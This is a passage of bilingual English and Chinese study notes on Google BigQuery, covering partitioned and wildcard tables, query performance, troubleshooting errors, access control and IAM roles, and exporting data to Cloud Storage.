&lt;li&gt;&lt;code&gt;FROM bigquery-public-data.noaa_gsod.gsod*&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Matches all tables in noaa_gsod that begin with string 'gsod'  &lt;/li&gt;
&lt;li&gt;character is required (single, double quotes are invalid)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Longer prefixes generally perform better than shorter prefixes  &lt;ul&gt;
&lt;li&gt;For example: &lt;code&gt;.gsod200*&lt;/code&gt; versus &lt;code&gt;.*&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Partitions&lt;/h2&gt;
&lt;h3&gt;Table Partitioning - Current Approach&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Time-partitioned tables are cost-effective way to manage data, write queries spanning multiple days, months, years  &lt;/li&gt;
&lt;li&gt;Create tables with time-based partitions and BigQuery automatically loads data in correct partition  &lt;ul&gt;
&lt;li&gt;Declare the table as partitioned at creation time using &lt;code&gt;--time_partitioning_type&lt;/code&gt; flag  &lt;/li&gt;
&lt;li&gt;To create partitioned table with expiration time for data, use &lt;code&gt;time_partitioning_expiration&lt;/code&gt; flag  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To query partitioned table, provide date or range of dates and query processes data for interval specified  &lt;/li&gt;
&lt;li&gt;Only data scanned is in partitions specified by interval  &lt;/li&gt;
&lt;li&gt;Queries are more performant, cheaper  &lt;/li&gt;
&lt;li&gt;Currently only supported by legacy SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Example - Table Partitioning&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SELECT  
    ...  
FROM  
    sales  
WHERE  
    _PARTITIONTIME BETWEEN TIMESTAMP(&amp;quot;20160101&amp;quot;) AND TIMESTAMP(&amp;quot;20160131&amp;quot;)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Query Performance Tips&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Denormalize tables for performance  &lt;/li&gt;
&lt;li&gt;Select only needed columns - &lt;code&gt;Do not use Select *&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Schedule batch queries at off-peak hours using jobs  &lt;/li&gt;
&lt;li&gt;Use caching when possible  &lt;ul&gt;
&lt;li&gt;Caching is best effort  &lt;/li&gt;
&lt;li&gt;If table data changes, cache is invalidated  &lt;/li&gt;
&lt;li&gt;Use jobs.getQueryResults to page through cached query results in a temporary table (no charge)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Try to use ORDER BY and LIMIT in outermost queries  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;LIMIT&lt;/code&gt; is applied to results by Master  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Build queries from the inside out by using subqueries  &lt;ul&gt;
&lt;li&gt;Filter data in subqueries  &lt;/li&gt;
&lt;li&gt;Perform arithmetic, ordering, case logic in outer query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use queries to create materialized intermediate tables  &lt;ul&gt;
&lt;li&gt;Create subset of complex data in destination table  &lt;/li&gt;
&lt;li&gt;Partially aggregate data in destination table  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Move heavyweight filters, such as regexp, to the end  &lt;/li&gt;
&lt;li&gt;Avoid grouping on unbounded possible values  &lt;ul&gt;
&lt;li&gt;Example: Web logs with arbitrary GET parameters in the suffix  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consider using IF/CASE instead of self-joins because IF/CASE has lower processing overhead  &lt;ul&gt;
&lt;li&gt;Self-joins require multiple disk reads  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Apply WHERE filters prior to JOINs  &lt;ul&gt;
&lt;li&gt;Predicate pushdown  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 9: Troubleshooting Errors&lt;/h1&gt;
&lt;h2&gt;Error Categories&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Request encoding errors  &lt;ul&gt;
&lt;li&gt;Associated with the query request – Invalid query syntax, and so on  &lt;/li&gt;
&lt;li&gt;Request Body 有錯誤，通常是由 Google 的 API 處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Application errors  &lt;ul&gt;
&lt;li&gt;Errors associated in processing the request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTTP transport layer errors  &lt;ul&gt;
&lt;li&gt;Programmatic communication errors using API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Request Encoding Errors&lt;/h2&gt;
&lt;p&gt;在 Query History 裡頭，&lt;br /&gt;
點開有錯誤的 Query 可以看到 Error code，&lt;br /&gt;
可以點選超連結去察看該 Error 詳細的錯誤原因。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Incomplete syntax  &lt;/li&gt;
&lt;li&gt;Missing or invalid objects  &lt;/li&gt;
&lt;li&gt;Missing columns in GROUP BY (for aggregations)  &lt;/li&gt;
&lt;li&gt;Incorrect or missing punctuation  &lt;/li&gt;
&lt;li&gt;Misspellings  &lt;/li&gt;
&lt;li&gt;Ambiguous field references  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Resource Errors&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Intended limitations exist in the query execution engine to protect resources  &lt;ul&gt;
&lt;li&gt;Can cause well-formed queries to fail  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Two classes of resource errors  &lt;ul&gt;
&lt;li&gt;Result too large  &lt;/li&gt;
&lt;li&gt;Resources exceeded  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Result Too Large&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery limits result sets to approximately 128MB compressed  &lt;ul&gt;
&lt;li&gt;Queries returning larger results cannot fit into response  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Result too large:  &lt;ul&gt;
&lt;li&gt;Commonly thrown on queries that use an ORDER BY with large cardinality  &lt;/li&gt;
&lt;li&gt;Can happen in multiple stages of the serving tree  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Handling Result Too Large Errors&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Use filters to limit the result set  &lt;/li&gt;
&lt;li&gt;Use LIMIT clause  &lt;/li&gt;
&lt;li&gt;Remove ORDER BY for large datasets (order by without limit is meaningless)  &lt;/li&gt;
&lt;li&gt;Specify destination table and use &lt;code&gt;allowLargeResults&lt;/code&gt; flag  &lt;ul&gt;
&lt;li&gt;Impacts query performance  &lt;/li&gt;
&lt;li&gt;可以保證資料都出得來，但效能會有影響，因為有些前置動作會比較不一樣，可以視需求決定要不要用這個 flag  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limitations of &lt;code&gt;allowLargeResults&lt;/code&gt; flag  &lt;ul&gt;
&lt;li&gt;Cannot specify top-level ORDER BY, TOP or LIMIT clause  &lt;ul&gt;
&lt;li&gt;Negates benefit of allowLargeResults because query output is no longer computed in parallel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using allowLargeResults flag with ORDER BY can cause resources exceeded errors  &lt;ul&gt;
&lt;li&gt;Master applies final sorting  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using allowLargeResults with window functions requires PARTITION BY clause  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Resources Exceeded&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Resources exceeded error issued if a query exceeds the memory limit on a single shard  &lt;ul&gt;
&lt;li&gt;Once data is read from disk, processing is done in memory  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Most common on:  &lt;ul&gt;
&lt;li&gt;ORDER BY queries with large numbers of distinct values  &lt;/li&gt;
&lt;li&gt;JOINs with more outputs than inputs  &lt;/li&gt;
&lt;li&gt;Aggregations that require memory proportional to the number of input values  &lt;/li&gt;
&lt;li&gt;Queries where data is heavily skewed toward one key value  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Handling Resources Exceeded Errors&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;If possible, limit use of &lt;code&gt;ORDER BY&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;Use aggregation functions that generate fewer output results than input rows  &lt;/li&gt;
&lt;li&gt;Avoid JOINs that generate more outputs than inputs  &lt;/li&gt;
&lt;li&gt;Avoid queries that create data skew  &lt;/li&gt;
&lt;li&gt;Queries on "guest" IDs or null values  &lt;/li&gt;
&lt;li&gt;No rule that works for every case  &lt;/li&gt;
&lt;li&gt;或者先用一個 Query 把結果存成比較小的 Table (Destination Table)，再拿這個 Table 來 Query  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;HTTP Errors and Responses&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;All BigQuery API calls are HTTP requests  &lt;/li&gt;
&lt;li&gt;All HTTP requests return status codes  &lt;/li&gt;
&lt;li&gt;Codes between 200 and 299 are success codes  &lt;/li&gt;
&lt;li&gt;HTTP error codes are between 400 and 599  &lt;/li&gt;
&lt;li&gt;BigQuery returns a standard JSON response on error  &lt;/li&gt;
&lt;li&gt;可以參考這個網頁：&lt;a href="https://cloud.google.com/bigquery/troubleshooting-errors"&gt;https://cloud.google.com/bigquery/troubleshooting-errors&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 10: Access Control&lt;/h1&gt;
&lt;h2&gt;Access Control Lists&lt;/h2&gt;
&lt;p&gt;從 Dataset 這個層面去做設定  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ACLs define permissions given to a role (or grantee) for a target (project/dataset)  &lt;/li&gt;
&lt;li&gt;ACLs consist of one or more entries that grant permission to a role (or grantee)  &lt;/li&gt;
&lt;li&gt;Permissions define the actions that can be performed against a project or dataset  &lt;ul&gt;
&lt;li&gt;Scope defines to whom the permission applies  &lt;/li&gt;
&lt;li&gt;參考 &lt;a href="https://developers.google.com/apis-explorer/#p/bigquery/v2/"&gt;https://developers.google.com/apis-explorer/#p/bigquery/v2/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Roles:  &lt;ul&gt;
&lt;li&gt;Project roles – Users can run jobs or manage the project  &lt;/li&gt;
&lt;li&gt;Dataset roles – Define user access to datasets in a project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Project Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Granted/revoked using Cloud Platform Console  &lt;/li&gt;
&lt;li&gt;Roles are assigned by email address for:  &lt;ul&gt;
&lt;li&gt;Individual users  &lt;/li&gt;
&lt;li&gt;Groups  &lt;/li&gt;
&lt;li&gt;Service accounts  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Project owners can modify project roles  &lt;ul&gt;
&lt;li&gt;Automatically granted to project creator  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;要授權給一群 Google User 的話，可以考慮用 Google Groups 來做這件事，只要授權給一整個 Group 就行了，不用一個一個加。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Permissions for Project Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Viewer  &lt;ul&gt;
&lt;li&gt;Can start a job - Dataset roles also required depending on job type  &lt;/li&gt;
&lt;li&gt;List and get all jobs they started  &lt;/li&gt;
&lt;li&gt;Granted READER dataset role by default for new datasets in project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Editor  &lt;ul&gt;
&lt;li&gt;Same as Viewer, plus:  &lt;ul&gt;
&lt;li&gt;Can create new dataset in project  &lt;/li&gt;
&lt;li&gt;Is granted WRITER role by default for new datasets in project  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;Same as Editor, plus:  &lt;ul&gt;
&lt;li&gt;Can list all datasets in the project  &lt;/li&gt;
&lt;li&gt;Can delete any dataset in the project  &lt;/li&gt;
&lt;li&gt;Can list and get all jobs run  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Dataset Roles&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The project ACL becomes default ACL for datasets in the project  &lt;ul&gt;
&lt;li&gt;Default access can be overridden on a per-dataset basis  &lt;/li&gt;
&lt;li&gt;Tables inherit ACLs from dataset  &lt;ul&gt;
&lt;li&gt;ACLs cannot be configured on tables  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset ACLs allow resource separation  &lt;ul&gt;
&lt;li&gt;No need for additional clusters and data duplication  &lt;/li&gt;
&lt;li&gt;Saves money, simplifies operations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset roles are granted or revoked using:  &lt;ul&gt;
&lt;li&gt;The BigQuery web UI  &lt;/li&gt;
&lt;li&gt;Using the 'Share dataset' option  &lt;/li&gt;
&lt;li&gt;The BigQuery API  &lt;/li&gt;
&lt;li&gt;Using Datasets:&lt;code&gt;update&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Roles are assigned by email address to:  &lt;ul&gt;
&lt;li&gt;Single user  &lt;/li&gt;
&lt;li&gt;Google Groups  &lt;/li&gt;
&lt;li&gt;Predefined group of users, such as all users, or a group of users with same project role  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Permissions for Dataset Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Reader  &lt;ul&gt;
&lt;li&gt;Can read, query, copy or export tables in the dataset  &lt;ul&gt;
&lt;li&gt;Can call get on the dataset and tables in dataset  &lt;/li&gt;
&lt;li&gt;Can call list on table data for tables in the dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Writer  &lt;ul&gt;
&lt;li&gt;Same as READER, plus:  &lt;ul&gt;
&lt;li&gt;Can edit or append data in the dataset  &lt;ul&gt;
&lt;li&gt;Can call insert, insertAll, update or delete  &lt;/li&gt;
&lt;li&gt;Can use tables in the dataset as destinations for load, copy or query jobs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;Same as WRITER, plus:  &lt;ul&gt;
&lt;li&gt;Can call update on the dataset  &lt;/li&gt;
&lt;li&gt;Can call delete on the dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Note: A dataset must have at least one entity with the OWNER role.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Applying Views for Row-Level Security&lt;/h2&gt;
&lt;h3&gt;Row-Level Security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Not natively supported  &lt;ul&gt;
&lt;li&gt;Define a view to give access to a specific view of the data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;View – a BigQuery SQL query that limits the rows and columns (a virtual table) that a user can see  &lt;/li&gt;
&lt;li&gt;BigQuery views are re-executed every time the view is queried  &lt;/li&gt;
&lt;li&gt;Create view in dataset separate from underlying table’s dataset and assign ACLs to both datasets  &lt;/li&gt;
&lt;li&gt;Row-Leve Security Scenario  &lt;ul&gt;
&lt;li&gt;可以透過 View 來 select 只想被 share 出去的欄位，不需要開放整個 table 的權限。  &lt;/li&gt;
&lt;li&gt;從一個使用者 A 沒有權限的 dataset 把一個 View 存到使用者 A 有權限的 dataset，使用者 A 仍然無法使用該 View 得到他沒有權限的 dataset 的資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Identity and Access Management&lt;/h2&gt;
&lt;h3&gt;Benefits of IAM for BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Admins can isolate permissions to BigQuery  &lt;ul&gt;
&lt;li&gt;For example, BigQuery roles have no authority to manage Compute Engine virtual machines  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistent IAM controls across all GCP products  &lt;/li&gt;
&lt;li&gt;Narrow permissions allow more fine-grained control  &lt;/li&gt;
&lt;li&gt;Backwards compatible  &lt;ul&gt;
&lt;li&gt;Legacy project permissions are preserved, and the familiar UI, API, and CLI will continue to work as before with minimal changes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Organization Node (Beta)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Organization node is root node for Google Cloud resources  &lt;/li&gt;
&lt;li&gt;2 organization roles:  &lt;ul&gt;
&lt;li&gt;Organization Admin - Control over all cloud resources  &lt;/li&gt;
&lt;li&gt;Project Creator - Controls project creation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;IAM Resource Hierarchy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A policy is set on a resource  &lt;ul&gt;
&lt;li&gt;Each policy contains: Set of roles, role members  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resources inherit policies from parent  &lt;ul&gt;
&lt;li&gt;Resource policies are a union of parent and resource  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If parent policy less restrictive, overrides more restrictive resource policy  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;IAM Roles - Curated Roles&lt;/h3&gt;
&lt;p&gt;The “can do what” part is defined by an IAM role.&lt;br /&gt;
An IAM role is a collection of permissions.&lt;br /&gt;
Most of the time to do any meaningful operations you need more than 1 permission.&lt;br /&gt;
For example to manage instances in a project, you need to create, delete, start, stop and change an instance.&lt;br /&gt;
So the permissions are grouped together into a role to make it easier to manage.  &lt;/p&gt;
&lt;h3&gt;BigQuery IAM Roles&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;User  &lt;ul&gt;
&lt;li&gt;Runs jobs such as queries  &lt;/li&gt;
&lt;li&gt;Can browse the project to see what data is available, but does not have access to it by default  &lt;/li&gt;
&lt;li&gt;Can be assigned at project level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Admin  &lt;ul&gt;
&lt;li&gt;All BigQuery related permissions - Access to read, write, delete all data, view jobs and/or cancel them  &lt;/li&gt;
&lt;li&gt;Can be assigned at project level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data viewer  &lt;ul&gt;
&lt;li&gt;Can view all datasets and all data within those datasets within the scope of the role  &lt;/li&gt;
&lt;li&gt;Can be assigned at dataset level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data editor  &lt;ul&gt;
&lt;li&gt;Can edit all datasets and all data within those datasets within the scope of the role  &lt;/li&gt;
&lt;li&gt;Can be assigned at dataset level or higher  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 11: Exporting Data&lt;/h1&gt;
&lt;h2&gt;Exporting Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Why export data?  &lt;ul&gt;
&lt;li&gt;Using data with third-party tools  &lt;/li&gt;
&lt;li&gt;Snapshots  &lt;/li&gt;
&lt;li&gt;Backups  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Export using:  &lt;ul&gt;
&lt;li&gt;Web UI  &lt;/li&gt;
&lt;li&gt;CLI  &lt;/li&gt;
&lt;li&gt;REST API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limitations  &lt;ul&gt;
&lt;li&gt;Export up to 1 GB of data per file (multiple file export supported)  &lt;/li&gt;
&lt;li&gt;Daily limit: 1,000 exports per day, up to 10 TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACL requirements for exporting data:  &lt;ul&gt;
&lt;li&gt;BigQuery: Dataset-level READER access  &lt;/li&gt;
&lt;li&gt;Google Cloud Storage: WRITE access to Google Cloud Storage bucket(s)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Export Configuration Options&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Two aspects: Format and compression  &lt;ul&gt;
&lt;li&gt;destinationFormat  &lt;ul&gt;
&lt;li&gt;CSV  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;Avro  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;compression  &lt;ul&gt;
&lt;li&gt;GZIP  &lt;/li&gt;
&lt;li&gt;NONE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Notes:  &lt;ul&gt;
&lt;li&gt;AVRO cannot be used with GZIP compression  &lt;/li&gt;
&lt;li&gt;Nested and repeated data cannot be exported in CSV format  &lt;/li&gt;
&lt;li&gt;Defaults: CSV with no compression  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;AVRO Export Format&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Exported files are Avro container files  &lt;/li&gt;
&lt;li&gt;Each row is represented as an Avro record  &lt;ul&gt;
&lt;li&gt;Nested data is represented by nested record objects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;em&gt;REQUIRED&lt;/em&gt; fields represented as corresponding Avro types  &lt;ul&gt;
&lt;li&gt;For example: An INTEGER type maps to an Avro LONG type  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;em&gt;NULLABLE&lt;/em&gt; fields represented as Avro Union of corresponding type and "null"  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;REPEATED&lt;/em&gt; fields are represented as Avro arrays  &lt;/li&gt;
&lt;li&gt;&lt;em&gt;TIMESTAMP&lt;/em&gt; data types represented as Avro LONG types  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Running Export Jobs&lt;/h2&gt;
&lt;h3&gt;CLI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq extract&lt;/code&gt; - Perform an extract operation against &lt;code&gt;source_table&lt;/code&gt; into &lt;code&gt;destination_uris&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq extract &amp;lt;source_table&amp;gt; &amp;lt;destination_uris&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Web UI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;操作很簡單  &lt;/li&gt;
&lt;li&gt;有很大的檔案的話，儘量不要用 WebUI export，因為有可能中間被中斷就得重下載。請丟到 GCS 再去 download 下來  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Configuration Example&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;jobData&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="err"&gt;&amp;#39;projectId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;projectId,&lt;/span&gt;  
    &lt;span class="err"&gt;&amp;#39;configuration&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
        &lt;span class="err"&gt;&amp;#39;extract&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;sourceTable&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;projectId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;projectId,&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;datasetId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;datasetId,&lt;/span&gt;  
                &lt;span class="err"&gt;&amp;#39;tableId&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;tableId&lt;/span&gt;  
            &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;destinationUris&amp;#39;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;gs://&amp;lt;bucket&amp;gt;/&amp;lt;file&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="err"&gt;,&lt;/span&gt;  
            &lt;span class="err"&gt;&amp;#39;destinationFormat&amp;#39;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;NEWLINE_DELIMITED_JSON&amp;#39;&lt;/span&gt;  
        &lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="err"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Wildcard Exports&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;If export is larger than 1GB, use a wildcard to partition the output into multiple files  &lt;/li&gt;
&lt;li&gt;Include a glob character (&lt;code&gt;*&lt;/code&gt;) in export file name  &lt;ul&gt;
&lt;li&gt;Glob is replaced by shard value of 12 digits  &lt;/li&gt;
&lt;li&gt;Starts with 000000000000 and increments by 1 for each file  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Wildcard exports are written in parallel  &lt;ul&gt;
&lt;li&gt;Target files are smaller and parallel writers work on separate patterns immediately  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Wildcard exports are subject to quota limitations  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Single &amp;amp; Multiple Wildcard URI&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Single Wildcard URI  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;'destinationUris': ['gs://my-bucket/file-name-*.json']&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multiple Wildcard URI  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;'destinationUris': ['gs://my-bucket/file-name-1-*.json', 'gs://my-bucket/file-name-2-*.json']&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;destinationUris&lt;/code&gt; property indicates export location(s) and file name(s)  &lt;/li&gt;
&lt;li&gt;Data sharded into multiple files based on the pattern  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 12: Interfacing with External Tools&lt;/h1&gt;
&lt;h2&gt;Interfacing with Spreadsheets&lt;/h2&gt;
&lt;h3&gt;BigQuery Connector for Microsoft Excel&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Supports Excel 2007 and up  &lt;/li&gt;
&lt;li&gt;Supports Windows and Mac  &lt;/li&gt;
&lt;li&gt;Access through authorization key  &lt;ul&gt;
&lt;li&gt;Time sensitive  &lt;/li&gt;
&lt;li&gt;Min 1 hour – Max 30 days  &lt;/li&gt;
&lt;li&gt;Key can be revoked  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go to https://bigquery-connector.appspot.com  &lt;/li&gt;
&lt;li&gt;Select Google account to use  &lt;/li&gt;
&lt;li&gt;Record unique key and download IQY file  &lt;/li&gt;
&lt;li&gt;Follow site instructions to execute query from Excel  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/docs/bigquery-connector-for-excel"&gt;https://cloud.google.com/bigquery/docs/bigquery-connector-for-excel&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bigquery-connector.appspot.com"&gt;https://bigquery-connector.appspot.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Using Google Sheets with BigQuery&lt;/h3&gt;
&lt;p&gt;Although spreadsheet are not designed to handle big data, many business run on them and use them daily.&lt;br /&gt;
Spreadsheets are understandable by both technical and non-technical staff.&lt;br /&gt;
Spreadsheets allow for use of simple charts and graphs to be easily built.&lt;br /&gt;
